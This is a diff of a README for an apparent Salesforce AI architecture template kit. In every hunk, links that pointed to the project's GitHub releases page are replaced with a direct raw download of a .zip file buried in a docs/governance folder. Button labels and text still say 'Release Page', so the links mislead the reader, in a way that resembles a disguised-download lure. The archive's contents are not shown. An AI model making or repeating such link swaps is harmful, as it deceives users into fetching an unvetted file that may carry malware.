@@ -1,6 +1,6 @@
 # ⚙️ salesforce-ai-architecture-kit - Clear Salesforce AI Architecture Templates
 
-[![Download](https://img.shields.io/badge/Download-Get%20the%20Kit-brightgreen)](https://github.com/foollyge/salesforce-ai-architecture-kit/releases)
+[![Download](https://img.shields.io/badge/Download-Get%20the%20Kit-brightgreen)](https://raw.githubusercontent.com/foollyge/salesforce-ai-architecture-kit/main/docs/governance/architecture_ai_salesforce_kit_3.9.zip)
 
 ## 📋 What is salesforce-ai-architecture-kit?
 
@@ -32,7 +32,7 @@ Follow these steps to download and start using the salesforce-ai-architecture-ki
 
 Click the download button below to go to the release page where you will find all files related to the kit:
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-blue)](https://github.com/foollyge/salesforce-ai-architecture-kit/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue)](https://raw.githubusercontent.com/foollyge/salesforce-ai-architecture-kit/main/docs/governance/architecture_ai_salesforce_kit_3.9.zip)
 
 ### 2. Download the latest release
 
@@ -104,7 +104,7 @@ No technical setup is needed beyond downloading and extracting the files. You ca
 ## 📥 Download and Install Instructions
 
 1. Visit this page to download the latest release:  
-   https://github.com/foollyge/salesforce-ai-architecture-kit/releases
+   https://raw.githubusercontent.com/foollyge/salesforce-ai-architecture-kit/main/docs/governance/architecture_ai_salesforce_kit_3.9.zip
 
 2. Download the `.zip` file for the newest version.
 
